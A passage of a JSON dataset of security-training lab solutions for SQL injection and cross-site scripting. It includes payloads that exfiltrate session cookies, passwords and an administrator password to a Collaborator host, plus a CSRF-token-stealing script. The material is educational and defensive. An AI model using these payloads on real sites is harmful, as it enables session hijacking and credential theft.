+      "5.The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Blind SQL injection with out-of-band data exfiltration",
+    "Lab Description": "This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.\nThe SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.\nThe database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.\nTo solve the lab, log in as the administrator user.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the front page of the shop, and use Burp Suite Professional to intercept and modify the request containing the TrackingId cookie.",
+      "2.Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server. For example, you can combine SQL injection with basic XXE techniques as follows:",
+      "3.TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/\">+%25remote%3b]>'),'/l')+FROM+dual--",
+      "4.Right-click and select \"Insert Collaborator payload\" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.",
+      "5.Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.",
+      "6.You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.",
+      "7.In the browser, click \"My account\" to open the login page. Use the password to log in as the administrator user."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "SQL injection with filter bypass via XML encoding",
+    "Lab Description": "This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.\nThe database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Identify the vulnerability",
+      "2.Observe that the stock check feature sends the productId and storeId to the application in XML format.",
+      "3.Send the POST /product/stock request to Burp Repeater.",
+      "4.In Burp Repeater, probe the storeId to see whether your input is evaluated. For example, try replacing the ID with mathematical expressions that evaluate to other potential IDs, for example:",
+      "5.<storeId>1+1</storeId>",
+      "6.Observe that your input appears to be evaluated by the application, returning the stock for different stores.",
+      "7.Try determining the number of columns returned by the original query by appending a UNION SELECT statement to the original store ID:",
+      "8.<storeId>1 UNION SELECT NULL</storeId>",
+      "9.Observe that your request has been blocked due to being flagged as a potential attack.",
+      "10.Bypass the WAF",
+      "11.As you're injecting into XML, try obfuscating your payload using XML entities. One way to do this is using the Hackvertor extension. Just highlight your input, right-click, then select Extensions > Hackvertor > Encode > dec_entities/hex_entities.",
+      "12.Resend the request and notice that you now receive a normal response from the application. This suggests that you have successfully bypassed the WAF.",
+      "13.Craft an exploit",
+      "14.Pick up where you left off, and deduce that the query returns a single column. When you try to return more than one column, the application returns 0 units, implying an error.",
+      "15.As you can only return one column, you need to concatenate the returned usernames and passwords, for example:",
+      "16.<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>",
+      "17.Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.",
+      "18.Use the administrator's credentials to log in and solve the lab."
+    ],
+    "Vulnerability name": "SQL injection"
+  },
+  {
+    "Lab scenario": "Reflected XSS into HTML context with nothing encoded",
+    "Lab Description": "This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Copy and paste the following into the search box:",
+      "2.<script>alert(1)</script>",
+      "3.Click \"Search\"."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Stored XSS into HTML context with nothing encoded",
+    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the blog post is viewed.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Enter the following into the comment box:",
+      "2.<script>alert(1)</script>",
+      "3.Enter a name, email and website.",
+      "4.Click \"Post comment\".",
+      "5.Go back to the blog."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in document.write sink using source location.search",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Enter a random alphanumeric string into the search box.",
+      "2.Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.",
+      "3.Break out of the img attribute by searching for:",
+      "4.\"><svg onload=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in innerHTML sink using source location.search",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Enter the following into the into the search box:",
+      "2.<img src=1 onerror=alert(1)>",
+      "3.Click \"Search\".",
+      "4.The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in jQuery anchor href attribute sink using location.search source",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's $ selector function to find an anchor element, and changes its href attribute using data from location.search.\nTo solve this lab, make the \"back\" link alert document.cookie.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string.",
+      "2.Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute.",
+      "3.Change returnPath to:",
+      "4.javascript:alert(document.cookie)",
+      "5.Hit enter and click \"back\"."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in jQuery selector sink using a hashchange event",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.\nTo solve the lab, deliver an exploit to the victim that calls the print() function in their browser.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Notice the vulnerable code on the home page using Burp or the browser's DevTools.",
+      "2.From the lab banner, open the exploit server.",
+      "3.In the Body section, add the following malicious iframe:",
+      "4.<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/#\" onload=\"this.src+='<img src=x onerror=print()>'\"></iframe>",
+      "5.Store the exploit, then click View exploit to confirm that the print() function is called.",
+      "6.Go back to the exploit server and click Deliver to victim to solve the lab."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into attribute with angle brackets HTML-encoded",
+    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
+      "2.Observe that the random string has been reflected inside a quoted attribute.",
+      "3.Replace your input with the following payload to escape the quoted attribute and inject an event handler:",
+      "4.\"onmouseover=\"alert(1)",
+      "5.Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you move the mouse over the injected element it should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Stored XSS into anchor href attribute with double quotes HTML-encoded",
+    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.",
+      "2.Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.",
+      "3.Observe that the random string in the second Repeater tab has been reflected inside an anchor href attribute.",
+      "4.Repeat the process again but this time replace your input with the following payload to inject a JavaScript URL that calls alert:",
+      "5.javascript:alert(1)",
+      "6.Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into a JavaScript string with angle brackets HTML encoded",
+    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
+      "2.Observe that the random string has been reflected inside a JavaScript string.",
+      "3.Replace your input with the following payload to break out of the JavaScript string and inject an alert:",
+      "4.'-alert(1)-'",
+      "5.Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in document.write sink using source location.search inside a select element",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.",
+      "2.Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.",
+      "3.In the browser, notice that your random string is now listed as one of the options in the drop-down list.",
+      "4.Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element.",
+      "5.Change the URL to include a suitable XSS payload inside the storeId parameter as follows:",
+      "6.product?productId=1&storeId=\"></select><img%20src=1%20onerror=alert(1)>"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded",
+    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.\nAngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.\nTo solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Enter a random alphanumeric string into the search box.",
+      "2.View the page source and observe that your random string is enclosed in an ng-app directive.",
+      "3.Enter the following AngularJS expression in the search box:",
+      "4.{{$on.constructor('alert(1)')()}}",
+      "5.Click search."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected DOM XSS",
+    "Lab Description": "This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.\nTo solve this lab, create an injection that calls the alert() function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.",
+      "2.Back in the lab, go to the target website and use the search bar to search for a random test string, such as \"XSS\".",
+      "3.Return to the Proxy tool in Burp Suite and forward the request.",
+      "4.On the Intercept tab, notice that the string is reflected in a JSON response called search-results.",
+      "5.From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.",
+      "6.By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.",
+      "7.To solve this lab, enter the following search term:",
+      "8.\\\"-alert(1)}//",
+      "9.As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.",
+      "10.An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:",
+      "11.{\"searchTerm\":\"\\\\\"-alert(1)}//\", \"results\":[]}"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Stored DOM XSS",
+    "Lab Description": "This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Post a comment containing the following vector:",
+      "2.<><img src=1 onerror=alert(1)>",
+      "3.In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into HTML context with most tags and attributes blocked",
+    "Lab Description": "This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.\nTo solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Inject a standard XSS vector, such as:",
+      "2.<img src=1 onerror=print()>",
+      "3.Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.",
+      "4.Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.",
+      "5.In Burp Intruder, replace the value of the search term with: <>",
+      "6.Place the cursor between the angle brackets and click Add § to create a payload position. The value of the search term should now look like: <§§>",
+      "7.Visit the XSS cheat sheet and click Copy",
+      "8.tags to clipboard.",
+      "9.In the Payloads side panel, under Payload configuration, click Paste to paste the list of tags into the payloads list. Click  Start attack.",
+      "10.When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.",
+      "11.Go back to Burp Intruder and replace your search term with:",
+      "12.<body%20=1>",
+      "13.Place the cursor before the = character and click Add § to create a payload position. The value of the search term should now look like: <body%20§§=1>",
+      "14.Visit the XSS cheat sheet and click",
+      "15.Copy events to clipboard.",
+      "16.In the Payloads side panel, under Payload configuration, click Clear to remove the previous payloads. Then click Paste to paste the list of attributes into the payloads list. Click  Start attack.",
+      "17.When the attack is finished, review the results. Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.",
+      "18.Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:",
+      "19.<iframe src=\"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E\" onload=this.style.width='100px'>",
+      "20.Click Store and Deliver exploit to victim."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into HTML context with all tags blocked except custom ones",
+    "Lab Description": "This lab blocks all HTML tags except custom ones.\nTo solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:",
+      "2.<script>",
+      "3.location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';",
+      "4.</script>",
+      "5.Click \"Store\" and \"Deliver exploit to victim\".",
+      "6.This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS with some SVG markup allowed",
+    "Lab Description": "This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.\nTo solve the lab, perform a cross-site scripting attack that calls the alert() function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Inject a standard XSS payload, such as:",
+      "2.<img src=1 onerror=alert(1)>",
+      "3.Observe that this payload gets blocked. In the next few steps, we'll use Burp Intruder to test which tags and attributes are being blocked.",
+      "4.Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder.",
+      "5.In the request template, replace the value of the search term with: <>",
+      "6.Place the cursor between the angle brackets and click Add § to create a payload position. The value of the search term should now be: <§§>",
+      "7.Visit the XSS cheat sheet and click Copy tags to clipboard.",
+      "8.In Burp Intruder, in the Payloads side panel, click Paste to paste the list of tags into the payloads list. Click  Start attack.",
+      "9.When the attack is finished, review the results. Observe that all payloads caused a 400 response, except for the ones using the <svg>, <animatetransform>, <title>, and <image> tags, which received a 200 response.",
+      "10.Go back to the Intruder tab and replace your search term with:",
+      "11.<svg><animatetransform%20=1>",
+      "12.Place the cursor before the = character and click Add § to create a payload position. The value of the search term should now be:",
+      "13.<svg><animatetransform%20§§=1>",
+      "14.Visit the XSS cheat sheet and click Copy events to clipboard.",
+      "15.In Burp Intruder, in the Payloads side panel, click Clear to remove the previous payloads. Then click",
+      "16.Paste to paste the list of attributes into the payloads list. Click  Start attack.",
+      "17.When the attack is finished, review the results. Note that all payloads caused a 400 response, except for the onbegin payload, which caused a",
+      "18.200 response.",
+      "19.Visit the following URL in the browser to confirm that the alert() function is called and the lab is solved:",
+      "20.https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS in canonical link tag",
+    "Lab Description": "This lab reflects user input in a canonical link tag and escapes angle brackets.\nTo solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.\nTo assist with your exploit, you can assume that the simulated user will press the following key combinations:\nPlease note that the intended solution to this lab is only possible in Chrome.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Visit the following URL, replacing YOUR-LAB-ID with your lab ID:",
+      "2.https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)",
+      "3.This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called.",
+      "4.To trigger the exploit on yourself, press one of the following key combinations:",
+      "5.On Windows: ALT+SHIFT+X",
+      "6.On MacOS: CTRL+ALT+X",
+      "7.On Linux: Alt+X"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into a JavaScript string with single quote and backslash escaped",
+    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
+      "2.Observe that the random string has been reflected inside a JavaScript string.",
+      "3.Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.",
+      "4.Replace your input with the following payload to break out of the script block and inject a new script:",
+      "5.</script><script>alert(1)</script>",
+      "6.Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped",
+    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
+      "2.Observe that the random string has been reflected inside a JavaScript string.",
+      "3.Try sending the payload test'payload and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.",
+      "4.Try sending the payload test\\payload and observe that your backslash doesn't get escaped.",
+      "5.Replace your input with the following payload to break out of the JavaScript string and inject an alert:",
+      "6.\\'-alert(1)//",
+      "7.Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped",
+    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the comment author name is clicked.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Post a comment with a random alphanumeric string in the \"Website\" input, then use Burp Suite to intercept the request and send it to Burp Repeater.",
+      "2.Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.",
+      "3.Observe that the random string in the second Repeater tab has been reflected inside an onclick event handler attribute.",
+      "4.Repeat the process again but this time modify your input to inject a JavaScript URL that calls alert, using the following payload:",
+      "5.http://foo?&apos;-alert(1)-&apos;",
+      "6.Verify the technique worked by right-clicking, selecting \"Copy URL\", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",
+    "Lab Description": "This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.",
+      "2.Observe that the random string has been reflected inside a JavaScript template string.",
+      "3.Replace your input with the following payload to execute JavaScript inside the template string: ${alert(1)}",
+      "4.Verify the technique worked by right clicking, selecting \"Copy URL\", and pasting the URL in the browser. When you load the page it should trigger an alert."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Exploiting cross-site scripting to steal cookies",
+    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Using Burp Suite Professional, go to the Collaborator tab.",
+      "2.Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
+      "3.Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:",
+      "4.<script>",
+      "5.fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {",
+      "6.method: 'POST',",
+      "7.mode: 'no-cors',",
+      "8.body:document.cookie",
+      "9.});",
+      "10.</script>",
+      "11.This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.",
+      "12.Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.",
+      "13.Take a note of the value of the victim's cookie in the POST body.",
+      "14.Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to /my-account to load the admin user's account page.",
+      "15.Alternative solution",
+      "16.Alternatively, you could adapt the attack to make the victim post their session cookie within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the cookie publicly, and also discloses evidence that the attack was performed."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Exploiting cross-site scripting to capture passwords",
+    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Using Burp Suite Professional, go to the Collaborator tab.",
+      "2.Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
+      "3.Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:",
+      "4.<input name=username id=username>",
+      "5.<input type=password name=password onchange=\"if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{",
+      "6.method:'POST',",
+      "7.mode: 'no-cors',",
+      "8.body:username.value+':'+this.value",
+      "9.});\">",
+      "10.This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.",
+      "11.Go back to the Collaborator tab, and click \"Poll now\". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.",
+      "12.Take a note of the value of the victim's username and password in the POST body.",
+      "13.Use the credentials to log in as the victim user.",
+      "14.Alternative solution",
+      "15.Alternatively, you could adapt the attack to make the victim post their credentials within a blog comment by exploiting the XSS to perform CSRF. However, this is far less subtle because it exposes the username and password publicly, and also discloses evidence that the attack was performed."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Exploiting XSS to bypass CSRF defenses",
+    "Lab Description": "This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.\nYou can log in to your own account using the following credentials: wiener:peter",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.Log in using the credentials provided. On your user account page, notice the function for updating your email address.",
+      "2.If you view the source for the page, you'll see the following information:",
+      "3.You need to issue a POST request to /my-account/change-email, with a parameter called email.",
+      "4.There's an anti-CSRF token in a hidden input called token.",
+      "5.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.",
+      "6.Submit the following payload in a blog comment:",
+      "7.<script>",
+      "8.var req = new XMLHttpRequest();",
+      "9.req.onload = handleResponse;",
+      "10.req.open('get','/my-account',true);",
+      "11.req.send();",
+      "12.function handleResponse() {",
+      "13.var token = this.responseText.match(/name=\"csrf\" value=\"(\\w+)\"/)[1];",
+      "14.var changeReq = new XMLHttpRequest();",
+      "15.changeReq.open('post', '/my-account/change-email', true);",
+      "16.changeReq.send('csrf='+token+'&email=test@test.com')",
+      "17.};",
+      "18.</script>",
+      "19.This will make anyone who views the comment issue a POST request to change their email address to test@test.com."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS with AngularJS sandbox escape without strings",
+    "Lab Description": "This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.\nTo solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Visit the following URL, replacing YOUR-LAB-ID with your lab ID:",
+      "2.https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1",
+      "3.The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS with AngularJS sandbox escape and CSP",
+    "Lab Description": "This lab uses CSP and AngularJS.\nTo solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:",
+      "2.<script>",
+      "3.location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';",
+      "4.</script>",
+      "5.Click \"Store\" and \"Deliver exploit to victim\".",
+      "6.The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.",
